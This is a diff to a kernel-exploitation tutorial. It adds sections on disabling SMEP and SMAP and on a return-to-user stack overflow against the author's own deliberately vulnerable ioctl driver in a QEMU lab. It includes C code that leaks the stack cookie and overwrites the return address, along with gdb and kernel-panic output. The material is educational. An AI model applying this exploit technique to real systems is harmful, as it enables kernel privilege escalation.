@@ -16,7 +16,8 @@
 	 * [Getting root shell](#getting-root-shell)  
 * [Return-to-user](#return-to-user)  
 	 * [Writing ioctl kernel driver](#writing-ioctl-kernel-driver)  
-	 * [Returning to the userland](#returning-to-the-userland)
+	 * [SMEP and SMAP](#smep-and-smap)
+	 * [Getting the stack cookie](#getting-the-stack-cookie)
 
 ## Creating the enviornment and the first kernel module
 
@@ -396,7 +397,11 @@ error_count = copy_user(msg_ptr, (unsigned long*)(arg+8), size * sizeof(int), OU
 ```  
 With this we are done with the kernel driver, we can move on to the exploitation.  
 
-### Returning to the userland  
+### SMEP and SMAP  
+There are two kernel mitigations that will make our work harder by exploiting this driver: `Supervisor Mode Execution Prevention` (SMEP) and `Supervisor Mode Access Prevention` (SMAP). SMEP make sure, that kernel space programs cannot execute instructions in memory pages with user-space addresses, thus making it impossible, to execute arbitrary code with kernel buffer overflow. SMAP is complementing this protection by removing read and write access to user-space pages. So, with these protections we cannot access user-space memory in any way.  
+SMEP and SMAP can be enabled within the CR4 control register by flipping the SMAP and SMEP bits. These features are implemented in the CPU architecture, but can be enabled and disabled on boot. For the next exploit we need to disable both for now. We can do this by modifying the boot.sh script. We just need to add `nosmep` and `nosmap`˛to the append flag.  
+
+### Getting the stack cookie  
 The exploit works this way: we perform a buffer overflow on the kernel stack, modifying the return address to an address from userland and there we will perform a privilege escalation. We can do this, because by returning from our kernel driver directly to our userland code, we will still be operating in kernel mode, and we will have the privilege to raise the privilege level of our user space program.  
 First, we need to leak the stack cookie from the kernel stack to be able to perform the exploit. For that, we can use the READ_STACK ioctl command on our device driver file. For that, we need a structure, that is gonna be read by the driver:  
 ```C
@@ -434,4 +439,79 @@ This looks something like this while running:
 [   36.411329] Stack read
 [+] Received message
 [+] Stack cookie: 0xeb9458cb2481e00
+```  
+
+### Returning to user space code  
+Now, that we can read the stack and gather the stack cookie, we are able to modify the return address as well. We need to do this in two steps:  
+1) Finding the return address on the kernel stack  
+2) Rewriting it to an address pointig to our code    
+
+For the first part I won't talk much about the process, but after some gdb sessions we know, that after the stack cookie comes the saved `ebp`, and then the return address. So we need a payload, that is containing 256 integers (ergo 128 longs), and after that 3 longs: 1 stack cookie that we saved, 1 dummy value and 1 address, we want to return to. That makes it 131 bytes. We can make this easily:  
+```C
+receiver->size = MSG_SIZE * 2;
+long msg[MSG_SIZE];                                                                                                                                                            
+for(int i = 0; i < MSG_SIZE;i++){
+	msg[i] = 0x4141414141414141;
+}
+
+msg[MSG_SIZE-3] = stack_cookie;
+...
+long dummy = 0x4444444444444444;
+msg[MSG_SIZE - 2] = dummy;
+msg[MSG_SIZE - 1] = (long)mem;
+```  
+So, what is going `mem` to be? This will be the address we want to return to. For testing purposes, I allocated shared memory with mmap, filled itt with `0xcc`, which is the x86 asm code to software interrupt. So if we execute the code, the execution gets interrupted.  
+```C
+char interrupts[50];
+for(int i = 0; i < 50; i++){
+	interrupts[i] = 0xcc;
+}
+void *mem = mmap(0, sizeof(interrupts), PROT_EXEC|PROT_READ|PROT_WRITE, MAP_SHARED | MAP_ANON, -1, 0);
+if((long)mem == -1){
+	printf("[-] Could not perform mmap\n");
+	perror("MMAP: ");
+	exit(-1);
+}
+  
+memcpy(mem, interrupts, sizeof(interrupts));
+```  
+Let's try this program:  
+```
+# ./ret2user 
+[+] Opening device file...
+[+] Trying to read from kernel stack...
+[   98.291866] Stack read
+[+] Received message
+[+] Stack cookie: 0xa8f7a31592c92f00
+[+] Address of interrupt zone: 0x0x7f5052f38000
+[   98.297817] Stack write
+```  
+At this point the execution is stopped, because I put a breakpoint before the return of the stack read. After returning, we can observe these instructions in gdb:  
+```
+► 0x7f5052f38000    int3    <SYS_read>
+        fd: 0xffffc9000025bf18 ◂— 0
+        buf: 0x5590d97ff6d0 ◂— 0
+        nbytes: 0x0
+   0x7f5052f38001    int3   
+   0x7f5052f38002    int3   
+   0x7f5052f38003    int3   
+   0x7f5052f38004    int3   
+   0x7f5052f38005    int3   
+   0x7f5052f38006    int3   
+   0x7f5052f38007    int3   
+   0x7f5052f38008    int3   
+   0x7f5052f38009    int3   
+   0x7f5052f3800a    int3
+```   
+Because the syscalls are called with software interrupts and there is still junk on the stack (we never removed the stack of the ioctl program), the os want's to make the `read` syscall, which has the number 0. But because we don't give it good parameters, it will result in a segmentation fault. But still, as you can see, we returned to the user space, and it still executes, so we can move on to the exploitation. Btw, we get kernel panic after this run (we can see the CR4 register with turned off SMEP and SMAP bits too):  
+```
+[   98.316673] int3: 0000 [#1] SMP NOPTI
+[   98.317604] CPU: 0 PID: 148 Comm: ret2user Tainted: G           O      5.11.0 #3
+[   98.317617] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
+[   98.317623] RIP: 0010:0x7f5052f38001
+[   98.317627] Code: Unable to access opcode bytes at RIP 0x7f5052f37fd7.
+...
+[   98.325097] CR2: 00007f5052f38000 CR3: 00000000044e6000 CR4: 00000000000006f0
+[   98.325100] Kernel panic - not syncing: Fatal exception in interrupt
+[   98.325416] Kernel Offset: disabled
 ```  
